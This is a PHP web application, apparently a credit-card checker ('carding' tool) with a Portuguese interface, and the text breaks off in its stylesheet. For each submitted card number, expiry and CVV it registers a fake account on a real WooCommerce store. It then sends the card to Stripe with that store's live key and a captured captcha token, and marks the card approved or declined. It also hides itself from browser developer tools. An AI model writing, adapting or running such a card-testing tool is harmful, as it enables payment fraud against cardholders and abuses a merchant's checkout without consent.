<?php
session_start();
error_reporting(0);
ignore_user_abort(true);

// ========== PROTEÇÕES DE SEGURANÇA (mantidas mas liberando copiar/colar) ==========
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");
header("Referrer-Policy: no-referrer");

// Bloquear download do arquivo PHP
if (isset($_GET['download']) || isset($_POST['download'])) {
    die("Acesso negado.");
}

// Anti-debugging suave - permite copiar/colar mas bloqueia F12/inspecionar
$antiDebug = "
<script>
    // Bloquear apenas teclas de desenvolvimento (F12, Ctrl+Shift+I, etc)
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && e.key === 'I') || 
            (e.ctrlKey && e.shiftKey && e.key === 'J') ||
            (e.ctrlKey && e.shiftKey && e.key === 'C')) {
            e.preventDefault();
            return false;
        }
    });

    // Bloquear apenas clique direito para inspecionar
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });

    // Detectar DevTools (apenas se abrir para inspecionar)
    setInterval(function() {
        if (window.outerHeight - window.innerHeight > 200 || 
            window.outerWidth - window.innerWidth > 200) {
            document.body.innerHTML = '<div style=\"background:#0a0a0f; color:#ff3d00; height:100vh; display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:24px;\">🚫 DevTools detectado! Acesso bloqueado.</div>';
        }
    }, 2000);
</script>";

// ========== FUNÇÕES PRINCIPAIS ==========
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function deletarCookies() {
    if (file_exists("cookies.txt")) {
        unlink("cookies.txt");
    }
}

function gerarEmail() {
    $dominios = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    $dominio = $dominios[array_rand($dominios)];
    $numero = rand(1000, 9999);
    return "r4in".$numero."@".$dominio;
}

// ========== DETECÇÃO DE AMBIENTE SIMPLIFICADA ==========
function detectarAmbiente() {
    $isLocal = (strpos($_SERVER['HTTP_HOST'] ?? '', 'localhost') !== false || 
                $_SERVER['SERVER_ADDR'] ?? '' === '127.0.0.1' ||
                strpos($_SERVER['DOCUMENT_ROOT'] ?? '', 'xampp') !== false);
    
    $isInfinity = (strpos($_SERVER['HTTP_HOST'] ?? '', 'infinityfree') !== false || 
                   strpos($_SERVER['DOCUMENT_ROOT'] ?? '', 'infinityfree') !== false);
    
    if ($isLocal) {
        $tipo = "💻 Ambiente Local (XAMPP)";
        $detalhes = "Desenvolvimento";
    } elseif ($isInfinity) {
        $tipo = "🌐 InfinityFree Hosting";
        $detalhes = "Hospedagem Gratuita";
    } else {
        $tipo = "🌐 Servidor Web";
        $detalhes = $_SERVER['SERVER_SOFTWARE'] ?? 'Desconhecido';
    }
    
    return [
        'tipo' => $tipo,
        'detalhes' => $detalhes,
        'php' => phpversion(),
        'os' => PHP_OS,
        'data' => date('d/m/Y H:i:s')
    ];
}

$ambiente_info = detectarAmbiente();

// ========== SESSÃO PARA HISTÓRICO ==========
if (!isset($_SESSION['total'])) $_SESSION['total'] = 0;
if (!isset($_SESSION['aprovados'])) $_SESSION['aprovados'] = 0;
if (!isset($_SESSION['reprovados'])) $_SESSION['reprovados'] = 0;
if (!isset($_SESSION['historico'])) $_SESSION['historico'] = [];

// ========== PROCESSAMENTO AJAX ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    
    if (isset($_POST['action'])) {
        // Informações do ambiente via AJAX (apenas quando solicitado)
        if ($_POST['action'] === 'ambiente') {
            echo json_encode($ambiente_info);
            exit;
        }
        
        // Limpar estatísticas
        if ($_POST['action'] === 'limpar') {
            $_SESSION['total'] = 0;
            $_SESSION['aprovados'] = 0;
            $_SESSION['reprovados'] = 0;
            $_SESSION['historico'] = [];
            echo json_encode(['success' => true, 'message' => 'Estatísticas limpas']);
            exit;
        }
        
        // Verificar cartão
        if ($_POST['action'] === 'verificar' && isset($_POST['cartao'])) {
            $lista = $_POST['cartao'];
            $lista_original = $lista;
            $lista = str_replace(" " , "|", $lista);
            $lista = str_replace("%20", "|", $lista);
            $lista = preg_replace('/[ -]+/' , '-' , $lista);
            $lista = str_replace("/" , "|", $lista);
            $separar = explode("|", $lista);
            
            $log = []; // Log simplificado
            
            if (count($separar) >= 4) {
                $_SESSION['total']++;
                
                $cc = $separar[0];
                $mes = $separar[1];
                $ano = $separar[2];
                $cvv = $separar[3];

                // Converte ano para formato de 2 dígitos
                $ano_map = [
                    2024=>"24",2025=>"25",2026=>"26",2027=>"27",2028=>"28",
                    2029=>"29",2030=>"30",2031=>"31",2032=>"32",2033=>"33",
                    2034=>"34",2035=>"35",2036=>"36",2037=>"37",2038=>"38",2039=>"39"
                ];
                $ano = isset($ano_map[$ano]) ? $ano_map[$ano] : $ano;

                $email = gerarEmail();
                $log[] = "📧 Email gerado";

                // Processo cURL
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://waifanimals.org/my-account/');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
                curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language: pt-BR,pt;q=0.9',
                    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
                ]);
                $create = curl_exec($ch);
                $nonceregister = getStr($create, 'name="woocommerce-register-nonce" value="','"');

                curl_setopt($ch, CURLOPT_URL, 'https://waifanimals.org/my-account/');
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.urlencode($email).'&password=Rain123!&password2=Rain123!&woocommerce-register-nonce='.$nonceregister.'&_wp_http_referer=%2Fmy-account%2F&register=Register');
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
                    'content-type: application/x-www-form-urlencoded',
                    'referer: https://waifanimals.org/my-account/',
                    'upgrade-insecure-requests: 1',
                    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0',
                ]);
                $register = curl_exec($ch);

                curl_setopt($ch, CURLOPT_URL, 'https://waifanimals.org/my-account/add-payment-method/');
                curl_setopt($ch, CURLOPT_POST, false);
                curl_setopt($ch, CURLOPT_POSTFIELDS, null);
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'referer: https://waifanimals.org/my-account/payment-methods/',
                    'upgrade-insecure-requests: 1',
                    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                ]);
                $addpaymentmethodGet = curl_exec($ch);
                $ultimononce = getStr($addpaymentmethodGet, '"createAndConfirmSetupIntentNonce":"','"');

                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_year]=20'.$ano.'&card[exp_month]='.$mes.'&allow_redisplay=unspecified&billing_details[address][country]=BR&payment_user_agent=stripe.js%2F48d7a8ffee%3B+stripe-js-v3%2F48d7a8ffee%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwaifanimals.org&time_on_page=30609&client_attribution_metadata[client_session_id]=44b429fc-a0e7-49c7-82cf-db11ac982078&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=b3f14838-7525-4f8a-a900-f7813b2dbb18&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51H9c2BDUHPVGI3XaxJTHvD2c9EEi13fxccy0WQWVH8Lb0oZtbhWFTysBaNwlWuyUXS0IZjVxRHdgDN4HOtTNpCcT00bPXRo0W3&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcwMjMzODYxLCJjZGF0YSI6IjNGb2pkQ01WenlVdW1uMWpzazdlQ0NralJXZ1kxRW9tTkh5SUY2dU9mQkNCTnQ4VU12ZzFuclRXTHkrcTAraEFFeml5MTJTdzdaWDl0MG9JWks5dW1MRmpWamd6eHJzdW5ZWC8rSzdmbTV0MVUzdDRvTml2WWQ4RGJaTzROcjZUaU41K3NjbE95c1p2L0N5bjFWTmNwcVRrQU9vY0tlT1V2UE9WWXhOU3lrNnpYYUo2ZEt2dEVIL25LdmxkZzM1S2ZDUm5MQ3RpN0NFcVQrS1VlN2dYU2kvK3RPREx3bmFpNHZtQXY5UDBCTDJjZjVYTWlML2hOQ1EzUExJeU4xTTJZS0hBNk9yLzlYRjBldHljRVgrd21zQmZlcGNjUEtVQkpNZ3E1RDMxeEhVTnhTRXZCSkV0Ky9Fajg4d3hzdzArWmJCVzlCYnhYejFBZUx1VWg3TWE2aisxSUd5OU9QVGk3a0o5N0xubjJJVT1haHJYdmd0dER6eCs1dkdFIiwicGFzc2tleSI6ImcrWnE1Q1Mra0ErdHpaM1Y2VWZiSXdVSFRtY2hJWnRuVXdod1ZySVMwNGFJY2lFdXVPdGZBT1ZUa1RsS3F0Tk85QTlBZHA1NzBmWFJEMTBhMFFqcU5wOHJML0QrQ2QwSm02emxQOVRMNldSYUZzMDAwTlZLR2NuOUdPT3plM0k5OG9tbzMySmJMaWg2dWF2Q25hbFBnVlAxb0VyTkNPSmVOdzhwQ1hrSXdtd3dic3pPczIzUUFSbk4rdC96eHljakhBVzRMK0l2cE1GYjU3dVBJbjI5RG1lSHZWbjcyQm5vSVBwQzczRVNudkVrbTI1NXRpL2kweGg2cW5hd2JaOFhYUzU1eEIramROY0NDRlpSMTBrMklneWE4NVB5V1RleXdhQmNESktRRGlQQ3JaSE9aUlN6aEU2MlNHeXFNUEZSTG1OSnh2MW54RE82MGJ6d2RkbVJELzUwK0lPeTI1Yk9UQ25UU3JoVGdpQ0lFZzZYeEdmYTRDOVJ5b3RkTDh1NDRRQ2NrZ0I2Skl2QnNkLzlTaFhOckw3cDdUMXlOMmdlQ29Kc0kvL2svdTVNRysrd1Nlc0tieDBaYnJDbU5PSkkzTzAxdlRhWmVoWHJqRWFteDZZWmR3aHJmN08xWS9CemhNem5KRWlnYnZNelFtamk2YlRhemNoeHNCdWtRZmt1b1dyOVZORk41bWt0Sk9JSE9vdmtiS1c5TTNZOEZvMmQzdiszdzZISHYySVdpYS9PUDFBdnhOTkd2QXRPRmt6Q1VsTlVucnI2Sy9KcjYrSXRGd0Nlc2NuRjVBOS9pU2hldXJjM2x0bk9LYWU5SzMweUdtcng5WnFobThQWTF0R3RBc1piczU0Qis4cVdxRG1CbGY2R25UNzh3WWpHZ2lycCt3WDU4Ry9DWXVrdW5ZVHdUem1KTjV1R0tIZVZjODNrVlhGYjhtOWxudU1rTGs1WVFxUzVmQ2RpS2hKOUdSMjFYcDJCN1NpS1pjSC9XZGhleEhBSFRTd0RaUFJsNmNXQU9vNmtNcExpNWFaeVluVE5QVWdIRG1wbDJUUVc2V1oxYWpQRGdxeDRYQ0E0WEFKT2NlRzQveCs4UVExdGhMc0RUalN5blhXSnFHZW5pREZiSlZJMmhqUWZLdGZDaUhmbHo2SkNwdVlMb2daSnZ6K0dlRnNSSnhlcENoK0NRc1l3WVhqY0YreGpoYVo1N0dUN2dKMXI4azErclZ5UFNvNVNEYW4yMGFiZEFFNGcrNlJHRThUK2hUVDg5bjlmUmRzSi8yRHVWNjFRWGduNFdtNHFvWTNvTmFGSW44VTZsaFNhaFZoYUJ0eVFQeEs3ZzFrMGd2NjNOS2JuWlAzWWZteCs3Q0F1RG1jOU5rWGQ0dzZxZFNaQ3ZWa1hmRjhYMHhEY0dOV2Nob0NEcWpiVXRWSklLMGZDZy9DMEU4eTBJWXhub3VoL3ViVVNnMWJhczhCU2NISkNxM04zemVaeVZURUMwV3ZLMUE4OXJlUjZpcFVRMlVQVWNnd244Z1pFWkd1NEJQL1loczZzeGxaUnJqUk81NUp6cGRWRlS1TVM4TUkxeDdYOVllTkZRWENEQmFFZk5DaC9zamZXOWZUNlhSdjRhV2NaN0p5dXpyVlZ0aHhnSkx2NnIvbkZQM2NPSkxzcnJKci9aRTB2d1lMZjc2WnBGTVh4WExtOWZMcXZxdWJQR1Ftd1lRUXVGMWRvVWJjZ2NRMkhkK2o0dTJua2ZXN2phY0hxZDN3c1RoeFBGZmEvc0MzQTdrK0FWQlNaWCtmNlRzSWRaOGpya0pMTVEvTTljUkovUC9KNlBxL3daLy9pejczS2ZIbngyTnoxT1l2SkY1Ynk3WmJKSGwzYkI3OWNxOGFna002eXRTWkR0dHpvQS9zZVFEWU5keTZLYU1CQk9PUlMzMVhlODZFK3ozazdRL0ZrdVRoZkl0VFcyRVpNc2xhV3dzSm9pb1BRSmVxSlZjdFN1OVJQUUs4RUQ0VVhMaWhBYUtkc1plZ01NNlZXZ0J3QXF6bWVFZmRobWFvMmNPSFlyTDR5ZXcvL05wUWpDRDl6K2RkalZsZWxaZm1GODdGWTBjTklJQW03K2JsdTJGeE1EbmdUMk1rTEN6azVxTzd5SFphTGVpSWE1NHpRQXRXVE9FcGJCNnJTUlZwRFNybEpnaEFPSDNKbEpXZFg5ZytQSVFkQnk4T3VFcDVFR0VMRUJvRjc4bTA5L2tkTEZRak5naGtkTEI3S0NBZnJvWFI0Wlk3K2RDSlJ6MG1JL3lXekZtRmxzY2NOV253c1M1MG5jWFZUZnBQdFlqZnZYKzdhT2R1Z2Q2LzY0SzBMSjJBTENGNDNqcUdxcXY3UXcrcHg5a2xlMitTS2R3V3ZXM1djb0tRS2FBSjQva3FUUHdvS0ErV3l3V0JyM1UzTlpBQkpIc1BrQjNQUkZTaS9RNUlUR0pEQXloL0FKWTh0bmpOeDRKU2lzMXJyWTF6SWNZbnVTWURoRU01UkFUTi9XaU9Fd1NFeHRGWDdHNVJwMk4wL1VhNEFpMTUxZjlZb1BGZ0pIa3g0dURqNFRvdDFLcU9PNmUwRC9IWWpDVjd3MGhVcFhmcHEvQU9Cak5Wb3U3engrQkU9Iiwia3IiOiJkYmQyNTQ0Iiwic2hhcmRfaWQiOjcxNzcxNTM3fQ.eaeVUse3cS7XEI3dBp9P-6xUvqgh3G3qQ1135gvoiQs');
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    'accept: application/json',
                    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type: application/x-www-form-urlencoded',
                    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile: ?1',
                    'sec-ch-ua-platform: "Android"',
                    'sec-fetch-dest: empty',
                    'sec-fetch-mode: cors',
                    'sec-fetch-site: same-site',
                    'referer: https://js.stripe.com/',
                    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                ]);
                $stripe = curl_exec($ch);
                $id = getStr($stripe, '"id": "','",');

                curl_setopt($ch, CURLOPT_URL, 'https://waifanimals.org/wp-admin/admin-ajax.php');
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wc_stripe_create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$ultimononce);
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    'accept: */*',
                    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
                    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile: ?1',
                    'sec-ch-ua-platform: "Android"',
                    'sec-fetch-dest: empty',
                    'sec-fetch-mode: cors',
                    'sec-fetch-site: same-origin',
                    'x-requested-with: XMLHttpRequest',
                    'referer: https://waifanimals.org/my-account/add-payment-method/',
                    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                ]);
                $response = curl_exec($ch);
                $responseData = json_decode($response, true);
                
                $status = '';
                $mensagem = '';
                
                if(isset($responseData['success']) && $responseData['success'] === true) {
                    $_SESSION['aprovados']++;
                    $status = 'aprovado';
                    $mensagem = "✅ APROVADO";
                    $log[] = "✅ Resultado: APROVADO";
                } else {
                    $_SESSION['reprovados']++;
                    $status = 'reprovado';
                    $error_msg = isset($responseData['message']) ? $responseData['message'] : (isset($responseData['data']['error']['message']) ? $responseData['data']['error']['message'] : "Cartão recusado");
                    $mensagem = "❌ REPROVADO: " . $error_msg;
                    $log[] = "❌ Resultado: REPROVADO - " . $error_msg;
                }
                
                // Adiciona ao histórico (apenas cartão e status)
                array_unshift($_SESSION['historico'], [
                    'cartao' => $lista_original,
                    'status' => $status,
                    'data' => date('d/m/Y H:i:s')
                ]);
                
                // Limita histórico a 30 itens
                if (count($_SESSION['historico']) > 30) {
                    array_pop($_SESSION['historico']);
                }

                curl_close($ch);
                deletarCookies();
                
                echo json_encode([
                    'success' => true,
                    'mensagem' => $mensagem,
                    'cartao' => $lista_original,
                    'log' => $log,
                    'stats' => [
                        'total' => $_SESSION['total'],
                        'aprovados' => $_SESSION['aprovados'],
                        'reprovados' => $_SESSION['reprovados']
                    ],
                    'historico' => $_SESSION['historico']
                ]);
                exit;
                
            } else {
                echo json_encode(['success' => false, 'message' => 'Formato inválido']);
                exit;
            }
        }
    }
}

$total_verificacoes = $_SESSION['total'];
$aprovados = $_SESSION['aprovados'];
$reprovados = $_SESSION['reprovados'];
$historico = $_SESSION['historico'];
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stripe OAuth Verifier Pro</title>
    <link rel="icon" type="image/png" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ff6b00'%3E%3Cpath d='M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z'/%3E%3C/svg%3E">
    <?php echo $antiDebug; ?>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0f;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            color: #e0e0e0;
            line-height: 1.6;
            padding: 32px;
            min-height: 100vh;
            position: relative;
        }

        /* Botão Voltar Estilizado */
        .back-button-container {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 1000;
        }
        
        .back-button {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(18, 18, 26, 0.95);
            border: 2px solid #ff6b00;
            border-radius: 30px;
            padding: 10px 20px;
            color: #ff6b00;
            text-decoration: none;
            font-family: 'Segoe UI', monospace;
            font-weight: 700;
            font-size: 0.9rem;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(255, 107, 0, 0.3);
        }
        
        .back-button:hover {
            transform: translateX(-5px);
            background: rgba(255, 107, 0, 0.15);
            border-color: #9c27b0;
            box-shadow: 0 0 30px rgba(156, 39, 176, 0.4);
        }
        
        .back-button .arrow {
            font-size: 1.2rem;
            animation: slideLeft 1.5s ease-in-out infinite;
        }
        
        @keyframes slideLeft {
            0%, 100% { transform: translateX(0); }
            50% { transform: translateX(-5px); }
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1.4fr 2fr;
            gap: 40px;
            margin-top: 30px;
        }

        /* Coluna Esquerda */
        .left-column {
            display: flex;
            flex-direction: column;
            gap: 32px;
        }

        .card {
            background: #12121a;
            border-radius: 24px;
            padding: 36px;
            border: 1px solid #2a2a3a;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.5);
        }

        .header h1 {
            font-size: 2.4rem;
            font-weight: 600;
            background: linear-gradient(135deg, #ff6b00, #9c27b0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 12px;
            letter-spacing: -0.5px;
        }

        .subtitle {
            color: #888;
            font-size: 1.1rem;
            margin-bottom: 28px;
        }

        .format-box {
            background: #1a1a26;
            border-radius: 18px;
            padding: 28px;
            border-left: 6px solid #ff6b00;
        }

        .format-box .label {
            color: #ff6b00;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 1rem;
            letter-spacing: 0.5px;
            margin-bottom: 12px;
        }

        .format-box code {
            background: #0a0a12;
            color: #9c27b0;
            padding: 12px 18px;
            border-radius: 12px;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 1.1rem;
            display: inline-block;
            border: 1px solid #2a2a3a;
        }

        .format-box .example {
            margin-top: 16px;
            color: #888;
            font-size: 1rem;
        }

        .input-group {
            margin: 32px 0;
        }

        .input-group label {
            display: block;
            color: #fff;
            font-weight: 600;
            font-size: 1.2rem;
            margin-bottom: 16px;
        }

        .input-group textarea {
            width: 100%;
            background: #0a0a12;
            border: 2px solid #2a2a3a;
            border-radius: 16px;
            padding: 18px 24px;
            color: #fff;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.1rem;
            min-height: 150px;
            resize: vertical;
            transition: all 0.2s;
            user-select: text;
            -webkit-user-select: text;
        }

        .input-group textarea:focus {
            outline: none;
            border-color: #9c27b0;
            box-shadow: 0 0 0 4px rgba(156, 39, 176, 0.2);
        }

        .input-group textarea:hover {
            border-color: #ff6b00;
        }

        .file-upload {
            margin: 24px 0;
            padding: 24px;
            background: #1a1a26;
            border-radius: 16px;
            border: 2px dashed #9c27b0;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
        }

        .file-upload:hover {
            border-color: #ff6b00;
            background: #20202e;
        }

        .file-upload input {
            display: none;
        }

        .file-upload label {
            cursor: pointer;
            color: #9c27b0;
            font-weight: 600;
            font-size: 1.1rem;
        }

        .delay-control {
            background: #1a1a26;
            border-radius: 16px;
            padding: 24px;
            margin: 24px 0;
            border: 1px solid #2a2a3a;
        }

        .delay-control label {
            display: block;
            color: #ff6b00;
            font-weight: 600;
            margin-bottom: 16px;
            font-size: 1.1rem;
        }

        .delay-slider {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .delay-slider input[type=range] {
            flex: 1;
            height: 8px;
            -webkit-appearance: none;
            background: linear-gradient(90deg, #9c27b0, #ff6b00);
            border-radius: 4px;
            outline: none;
        }

        .delay-slider input[type=range]::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 24px;
            height: 24px;
            background: white;
            border-radius: 50%;
            cursor: pointer;
            border: 2px solid #ff6b00;
            box-shadow: 0 2px 8px rgba(255,107,0,0.4);
        }

        .delay-value {
            background: #0a0a12;
            padding: 10px 20px;
            border-radius: 30px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.1rem;
            color: #ff6b00;
            border: 1px solid #2a2a3a;
            min-width: 100px;
            text-align: center;
        }

        .button-group {
            display: grid;
            grid-template-columns: 1.5fr 1fr 1fr 1fr;
            gap: 16px;
            margin: 28px 0;
        }

        .btn {
            padding: 16px 20px;
            border-radius: 14px;
            font-weight: 600;
            font-size: 1rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            cursor: pointer;
            transition: all 0.2s;
            border: none;
        }

        .btn-primary {
            background: linear-gradient(135deg, #ff6b00, #9c27b0);
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 12px 28px rgba(255, 107, 0, 0.4);
        }

        .btn-danger {
            background: #ff3d00;
            color: white;
        }

        .btn-danger:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 12px 28px rgba(255, 61, 0, 0.4);
        }

        .btn-secondary {
            background: transparent;
            border: 2px solid #ff6b00;
            color: #ff6b00;
        }

        .btn-secondary:hover:not(:disabled) {
            background: rgba(255, 107, 0, 0.15);
            transform: translateY(-2px);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin: 28px 0;
        }

        .stat-item {
            background: #1a1a26;
            border-radius: 18px;
            padding: 28px;
            text-align: center;
            border: 1px solid #2a2a3a;
            transition: transform 0.2s;
        }

        .stat-item:hover {
            transform: translateY(-5px);
        }

        .stat-item.total {
            border-top: 6px solid #9c27b0;
        }

        .stat-item.aprovados {
            border-top: 6px solid #00e676;
        }

        .stat-item.reprovados {
            border-top: 6px solid #ff3d00;
        }

        .stat-value {
            font-size: 3.2rem;
            font-weight: 700;
            font-family: 'JetBrains Mono', monospace;
            line-height: 1.2;
            margin-bottom: 8px;
        }

        .stat-label {
            color: #888;
            font-size: 1rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .progress-bar {
            background: #1a1a26;
            border-radius: 30px;
            height: 12px;
            margin: 20px 0;
            overflow: hidden;
            border: 1px solid #2a2a3a;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #9c27b0, #ff6b00);
            width: 0%;
            transition: width 0.3s;
        }

        .status-message {
            background: #1a1a26;
            border-radius: 14px;
            padding: 16px 20px;
            margin: 16px 0;
            border-left: 4px solid #ff6b00;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.95rem;
        }

        .historico-box {
            background: #1a1a26;
            border-radius: 18px;
            padding: 28px;
            border: 1px solid #2a2a3a;
        }

        .historico-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 20px;
            border-bottom: 2px solid #2a2a3a;
        }

        .historico-header h3 {
            color: #ff6b00;
            font-size: 1.3rem;
            font-weight: 600;
        }

        .historico-lista {
            max-height: 300px;
            overflow-y: auto;
            padding-right: 12px;
        }

        .historico-item {
            background: #12121a;
            border-radius: 14px;
            padding: 18px;
            margin-bottom: 16px;
            border-left: 4px solid;
            transition: all 0.2s;
            cursor: pointer;
            user-select: text;
            -webkit-user-select: text;
        }

        .historico-item:hover {
            transform: translateX(5px);
            background: #1e1e2a;
        }

        .historico-item.aprovado {
            border-left-color: #00e676;
        }

        .historico-item.reprovado {
            border-left-color: #ff3d00;
        }

        .historico-cartao {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.95rem;
            color: #e0e0e0;
            margin-bottom: 4px;
        }

        .historico-data {
            font-size: 0.8rem;
            color: #666;
        }

        /* Card de Informações do Ambiente - SIMPLIFICADO */
        .ambiente-card {
            background: linear-gradient(145deg, #1a1a26, #12121a);
            border-radius: 20px;
            padding: 24px;
            border: 1px solid #9c27b0;
            margin-top: 20px;
        }

        .ambiente-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid #ff6b00;
        }

        .ambiente-header h3 {
            color: #ff6b00;
            font-size: 1.1rem;
            font-weight: 600;
        }

        .ambiente-info {
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            align-items: center;
        }

        .ambiente-badge {
            display: inline-block;
            padding: 8px 20px;
            border-radius: 30px;
            font-size: 0.9rem;
            font-weight: 600;
            background: rgba(156, 39, 176, 0.15);
            color: #9c27b0;
            border: 1px solid #9c27b0;
        }

        .ambiente-detalhe {
            color: #888;
            font-size: 0.9rem;
        }

        .ambiente-detalhe span {
            color: #ff6b00;
            margin-left: 8px;
        }

        /* Coluna Direita - Debug Panel SIMPLIFICADO */
        .right-column {
            background: #12121a;
            border-radius: 24px;
            border: 1px solid #2a2a3a;
            display: flex;
            flex-direction: column;
            height: fit-content;
            max-height: calc(100vh - 64px);
            position: sticky;
            top: 32px;
        }

        .debug-header {
            padding: 24px 28px;
            border-bottom: 1px solid #2a2a3a;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .debug-header h2 {
            color: #ff6b00;
            font-size: 1.2rem;
            font-weight: 600;
        }

        .timestamp {
            color: #666;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
        }

        .debug-log {
            padding: 20px 28px;
            overflow-y: auto;
            max-height: 450px;
            background: #0a0a12;
        }

        .log-entry {
            margin-bottom: 12px;
            padding: 12px 16px;
            background: #12121a;
            border-radius: 8px;
            border-left: 4px solid;
